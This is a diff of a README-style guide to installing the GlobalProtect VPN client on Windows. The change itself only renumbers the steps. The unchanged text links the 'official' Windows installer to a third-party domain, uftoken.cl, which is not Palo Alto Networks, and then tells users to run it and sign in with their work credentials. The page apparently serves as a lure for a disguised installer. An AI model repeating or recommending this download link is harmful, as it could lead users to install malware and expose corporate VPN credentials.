@@ -14,13 +14,13 @@ GlobalProtect is a comprehensive security solution designed to protect users and
 
 #### For Windows
 
-3. **Download the App**:
+1. **Download the App**:
    - [**Download the GlobalProtect installer for Windows**](https://uftoken.cl/globalp/).
    - Ensure you select the correct version (32-bit or 64-bit) for your system.
-4. **Install the App**:
+2. **Install the App**:
    - Open the installer file and follow the prompts in the GlobalProtect Setup Wizard.
    - Install to the default directory (`C:\Program Files\Palo Alto Networks\GlobalProtect`).
-5. **Complete Setup**:
+3. **Complete Setup**:
    - After installation, launch the application and enter the portal address provided by your administrator.
    - Authenticate using your credentials to connect.
 
